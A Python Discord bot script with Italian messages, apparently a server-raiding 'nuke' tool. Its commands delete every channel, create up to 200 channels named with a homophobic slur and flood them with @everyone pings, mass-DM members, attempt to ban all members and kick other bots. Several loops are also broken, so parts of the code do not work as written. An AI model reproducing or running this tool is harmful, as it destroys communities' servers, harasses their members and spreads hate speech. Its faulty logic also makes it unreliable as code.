import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix= ".", intents=intents)

@bot.event
async def on_ready():
    print(f'il bot {bot.user} e attivo')

@bot.command()
@commands.has_permissions(administrator=True)
async def n(ctx, num_channels: int = 200):
    guild = ctx.guild
    eliminato = 0
    for channel in guild.channels[:]: 
        try:
            await channel.delete(reason="nuke")
            eliminato +=1
            print(f"{channel.name} eliminato")
        except:
            pass
    canali_creati = []
    for i in range(num_channels): 
        try:
            channel_name = "frocio"
            new_channel = await guild.create_text_channel(channel_name)
            canali_creati.append(new_channel)
            print(f"{channel.name} creato")
        except:
            pass
    spam = "**@everyone**"
    
    for channel in canali_creati: 
        for _ in range(5):
            try:
                await channel.send(spam, allowed_mentions=discord.AllowedMentions(everyone=True))
            except:
                pass
@n.error
async def n_errori(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("non hai il permesso **amministratore**")
    else:
        await ctx.send(f"errore: {error}")

@bot.command()
async def dmall(ctx, *, messaggio: str):
    await ctx.send(f"invio messaggio a tutti")
    inviati = 0
    falliti = 0
    for member in ctx.guild.members:
        if member.bot:
            continue
        if member == ctx.author:
            continue 
   
    try:
        await member.send(messaggio)
    except discord.Forbidden:
        falliti +=1 
    except discord.HTTPException:
        falliti +=1
        await asyncio.sleep(2)
    await ctx.send("messaggio inviato a tutti gli utenti")
@dmall.error
async def dmall_errori(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("non hai il permesso **amministratore**")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("manca il messaggio da inviare")
    else:
        await ctx.send(f"errore: {error}")

@bot.command()
async def banall(ctx, motivo: str=None):
    for member in ctx.guild.members:
        if member.bot: 
            continue
        if member == ctx.author:
            continue
    try:
        await ctx.guild.ban(member, reason = motivo)
    except:
        pass
    await ctx.send("bannati tutti con successo")
@banall.error
async def banall_errori(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("non hai il permesso **amministratore**")
    else:
        await ctx.send(f"errore: {error}")
@bot.command()
async def kickbots(ctx):
    guild = ctx.guild
    bot_id = bot.user.id

    kick_tasks = []
    count = 0

    for member in ctx.guild.members:
       if member.bot and member.id != bot_id:
        kick_tasks.append(member.kick(reason="bot kick"))
        count += 1
    if len(kick_tasks) >= 20:
       await asyncio.gather(kick_tasks, return_exceptions=True)
       kick_tasks = []
    if kick_tasks:
      await asyncio.gather(kick_tasks, return_exceptions=True)
      await ctx.send(f"kicked {count} bots.")

bot.run("YOUR_BOT_TOKEN")
